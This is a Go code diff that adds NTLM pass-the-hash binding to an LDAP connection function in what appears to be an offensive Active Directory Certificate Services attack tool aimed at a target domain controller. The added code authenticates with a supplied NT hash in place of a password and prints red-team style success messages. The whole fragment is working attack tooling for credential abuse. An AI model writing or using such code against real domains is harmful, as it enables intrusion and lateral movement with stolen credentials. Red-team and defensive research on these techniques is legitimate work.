@@ -292,8 +292,21 @@ func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
 		return nil, fmt.Errorf("connect to %s: %w", cfg.TargetDC, err)
 	}
 
-	// Bind with credentials
-	if cfg.Username != "" && cfg.Password != "" {
+	// Bind with credentials — pass-the-hash takes priority over password
+	if cfg.Username != "" && cfg.Hash != "" {
+		// NTLM pass-the-hash: supply the NT hash directly; the SASL mechanism
+		// uses it in place of a derived NTLM response, so plaintext is never needed.
+		req := &ldap.NTLMBindRequest{
+			Domain:   cfg.Domain,
+			Username: cfg.Username,
+			Hash:     cfg.Hash,
+		}
+		if _, err := conn.NTLMChallengeBind(req); err != nil {
+			conn.Close()
+			return nil, fmt.Errorf("NTLM pass-the-hash bind as %s\\%s: %w", cfg.Domain, cfg.Username, err)
+		}
+		fmt.Printf("[+] NTLM pass-the-hash bind successful: %s\\%s\n", cfg.Domain, cfg.Username)
+	} else if cfg.Username != "" && cfg.Password != "" {
 		bindDN := buildBindDN(cfg.Username, cfg.Domain)
 		if err := conn.Bind(bindDN, cfg.Password); err != nil {
 			conn.Close()
